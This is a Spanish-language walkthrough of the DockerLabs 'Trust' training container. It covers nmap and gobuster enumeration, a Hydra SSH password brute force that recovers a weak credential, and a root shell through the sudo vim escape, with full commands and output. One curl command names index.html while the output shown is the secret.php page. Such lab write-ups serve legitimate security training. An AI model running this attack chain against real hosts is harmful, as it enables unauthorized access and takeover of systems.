![](adjuntos/Pasted%20image%2020260220022625.png)


# Trust – DockerLabs

> Compromiso de un entorno Docker mediante enumeración web, obtención de credenciales válidas por fuerza bruta en SSH y escalada a root aprovechando una mala configuración de `sudo` (vim – GTFOBins).
> 



## 1️⃣ Lab Information

- **Plataforma:**  [DockerLabs](https://dockerlabs.es)
- **Tipo de entorno:** Contenedor Docker
- **Servicio objetivo:** Apache 2.4.57 (Debian) + OpenSSH 9.2p1
- **Vulnerabilidad explotada:** Credenciales débiles en SSH + mala configuración de `sudo` (ejecución de vim como root – GTFOBins)
- **Dificultad:** Easy–Media

### Habilidades demostradas

- Enumeración completa de servicios (Nmap)
- Descubrimiento de recursos ocultos (Gobuster)
- Análisis manual de endpoints web (`secret.php`)
- Identificación de usuario válido a partir de pista web
- Ataque dirigido de fuerza bruta con Hydra contra SSH
- Acceso interactivo vía SSH
- Enumeración de privilegios con `sudo -l`
- Escalada de privilegios mediante abuso de binarios permitidos (GTFOBins – vim)
- Validación de compromiso total del sistema (root access)
## 🐳 2️⃣ Despliegue

La máquina se despliega como contenedor mediante el script proporcionado:

```bash
sudo bash auto_deploy.sh trust.tar
[+] Image loaded successfully 
[+] Container started 
[+] Assigned IP: 172.18.0.2
```


## 🔎 3️⃣ Enumeración
```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.18.0.2 escaneo
```
```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
```

## 4️⃣ Análisis

El escaneo identificó dos servicios expuestos:

- **22/tcp → SSH (OpenSSH 9.2p1)**
- **80/tcp → HTTP (Apache 2.4.57 – Debian)**

El acceso inicial por IP (`172.18.0.2`) mostró únicamente la página por defecto de Apache (_Apache2 Debian Default Page – It works_), lo que indica que no existe CMS visible en la raíz del servidor.

Se procedió a realizar enumeración de directorios mediante herramientas de fuerza bruta, identificando un recurso oculto:

- `/secret.php` → `200 OK`

El acceso a dicho endpoint reveló contenido dinámico con una referencia explícita a un posible usuario del sistema (**“Mario”**).

 En esta fase, el servicio HTTP se considera la superficie de ataque prioritaria para la recolección de información, permitiendo posteriormente pivotar hacia el servicio SSH como vector de acceso inicial.


## 5️⃣ Identificación del vector de acceso

Tras confirmar que la raíz del servidor únicamente exponía la página por defecto de Apache, se procedió a realizar enumeración avanzada de recursos ocultos.

5.1 Usamos el comando:
```bas
gobuster dir -u http://172.18.0.2/ \
-w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
-x php,txt,html
```
Dándonos como resultado:
```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.18.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/secret.php           (Status: 200) [Size: 927]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882236 / 882240 (100.00%)
===============================================================
Finished
===============================================================
```

5.2 Inspecionamos manualmente estos dos contenidos 
```bash
/secret.php           (Status: 200) [Size: 927]
```
Podemos hacer **curl** o bien metiéndonos en http://172.18.0.2/secret.php en el navegador
- **curl**:
 ```bash
 curl http://172.18.0.2/index.html
 ```
```bash
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>¡Secreto!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #333;
        }
        p {
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Hola Mario,</h1>
        <p>Esta web no se puede hackear.</p>
    </div>
</body>
</html>
```
- http://172.18.0.2/secret.php :

![](adjuntos/Pasted%20image%2020260220030009.png)

## 6️⃣ Explotación

Con el usuario `mario` identificado y el servicio SSH expuesto, se ejecutó un ataque de fuerza bruta dirigido contra el puerto 22.
```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt 172.18.0.2 -t 5 ssh
```
Dando como resultado:
```bash
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-20 03:04:20
[DATA] max 5 tasks per 1 server, overall 5 tasks, 14344399 login tries (l:1/p:14344399), ~2868880 tries per task
[DATA] attacking ssh://172.18.0.2:22/
[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-20 03:05:14
```

Se obtuvo una credencial válida:

```bash
mario : chocolate
```

## 7️⃣ Validación de acceso (Post-explotación)

Una vez obtenidas las credenciales válidas, se establece conexión SSH al sistema objetivo.
```bash
ssh mario@172.18.0.2
```
```bash
mario@172.18.0.2's password: 
Linux 099195da51ae 6.12.32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.32-1parrot1 (2025-06-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21
mario@099195da51ae:~$ whoami
mario
mario@099195da51ae:~$  
```
## 8️⃣ Escalada de privilegios

Tras obtener acceso como usuario `mario`, se procedió a enumerar privilegios sudo disponibles.
```bash
sudo -l
```
Dando como resultado:
```bash
Matching Defaults entries for mario on 099195da51ae:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 099195da51ae:
    (ALL) /usr/bin/vim
```

Se identificó que el usuario podía ejecutar el binario `/usr/bin/vim` con privilegios elevados.

### Identificación del método de explotación

Se consultó la base de datos pública de técnicas de abuso de binarios permitidos  [https://gtfobins.org/](https://gtfobins.org/) para determinar si `vim` permite ejecución de comandos del sistema.

Confirmando que es posible invocar una shell desde el propio editor.
- Ejecución del bypass:
```bash
sudo vim -c ':!/bin/bash'
```
Dándonos una shell del sistema
```bash
:!/bin/bash
root@099195da51ae:/home/mario# whoami
root
root@099195da51ae:/home/mario#
```

## 🏁 Conclusión

El laboratorio evidencia cómo una enumeración precisa puede transformar una superficie web mínima en un vector de acceso real al sistema.

La combinación de credenciales débiles en SSH y una configuración insegura de `sudo` (ejecución de `vim` con privilegios elevados) permitió el compromiso completo del entorno.